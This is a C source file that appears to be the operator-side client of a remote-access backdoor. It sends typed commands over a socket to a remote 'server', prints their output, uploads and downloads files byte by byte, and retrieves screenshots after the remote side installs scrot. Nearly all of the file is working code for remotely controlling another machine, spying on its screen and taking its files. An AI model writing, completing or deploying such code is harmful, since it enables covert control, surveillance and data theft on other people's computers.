#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include "debug.h"
#include "comms.h"

// Used to set the socket's file descriptor for communication.
// If called with a value of zero, this simply returns the current file descriptor used for communication.
int comms_fd(int fd_new) {
    static int fd;
    if(fd_new != 0) {
        fd = fd_new;
    }
    return fd;
}

// Reads a single command from stdin, sends it to the server, and return it.
// The string that this returns is allocated on the heap and must be free'd.
char *send_cmd() {
    char *cmd;
    int len;

    cmd = malloc(CMDLEN);
    if(cmd == NULL) {
        debug_err("Error in malloc()");
        exit(1);
    }

    // Read a command from stdin
    printf("> ");
    memset(cmd, 0, CMDLEN);
    fgets(cmd, CMDLEN, stdin);
    len = strlen(cmd) - 1;
    cmd[len] = '\0';

    // Send the command (without the \n at the end)
    if(send(comms_fd(0), cmd, len, 0) < 0) {
        debug_err("Error in send()");
        exit(1);
    }

    // Return the command
    return cmd;
}

// Gets the output of a command from the server and prints it out
void get_output() {
    char *output;
    int bytes_available;

    output = malloc(CMDLEN);
    if(output == NULL) {
        debug_print("Error in malloc()");
        exit(1);
    }

    do {
        // Get the output
        memset(output, 0, CMDLEN);
        if(recv(comms_fd(0), output, CMDLEN, 0) == -1) {
            debug_err("Error in recv()");
            exit(1);
        }
        printf("%s", output);

        // Check if more bytes are available to read.
        // If there are no bytes right now, wait a moment and try checking again.
        ioctl(comms_fd(0), FIONREAD, &bytes_available);
        if(!bytes_available) {
            sleep(WAIT);
            ioctl(comms_fd(0), FIONREAD, &bytes_available);
        }
    } while(bytes_available);

    free(output);
}

// Uploads a local file to the server
// Triggered whenever the "upload" command is used
void send_file(char *file) {
    FILE *f;
    size_t filesz, i;
    char byte;

    // Open the file
    f = fopen(file, "r");
    if(f != NULL) {
        // Find the length of the file
        fseek(f, 0L, SEEK_END);
        filesz = ftell(f);
        rewind(f);

        // Send the length of the data to the server
        if(send(comms_fd(0), &filesz, sizeof(filesz), 0) < 0) {
            debug_err("Error in send()");
            exit(1);
        }

        // Send the data byte by byte
        for(i = 0; i < filesz; i++) {
            if(fread(&byte, 1, 1, f)) {
                if(send(comms_fd(0), &byte, 1, 0) < 0) { // Send a single byte
                    debug_err("Error in send()");
                    exit(1);
                }
            }
        }

        fclose(f);
    }
}

// Downloads a remote file from the server.
// Triggered whenever the "download" command is used.
void get_file(char *file) {
    FILE *f;
    size_t filesz, i;
    char byte;

    // Open the file
    f = fopen(file, "w+");
    if(f != NULL) {
        printf("Writing downloaded file to %s...\n", file);

        // Get the length of the data
        if(recv(comms_fd(0), &filesz, sizeof(filesz), 0) == -1) {
            debug_err("Error in recv()");
            exit(1);
        }

        // Read the data byte by byte and print out the byte to the file
        for(i = 0; i < filesz; i++) {
            if(recv(comms_fd(0), &byte, 1, 0) == -1) {
                debug_err("Error in recv()");
            }
            fputc(byte, f);
        }

        fclose(f);
    }
}

// Additional command processing for taking a screenshot
void screenshot() {
    char output[1024] = {0};

    // Get the immidiate output of the command and print it out
    debug_print("Note that this command may take some time to finish executing as it installs scrot.\n");
    if(recv(comms_fd(0), output, 1024, 0) == -1) {
        debug_err("Error in recv()");
        exit(1);
    }

    // Check if a screenshot was actually taken
    if(strcmp(output, "Screenshot taken and saved to out.png.\n") == 0) {
        // Download the screenshot and save it into out.png
        get_file("out.png");
    }

    // Print the output
    printf("%s", output);
}
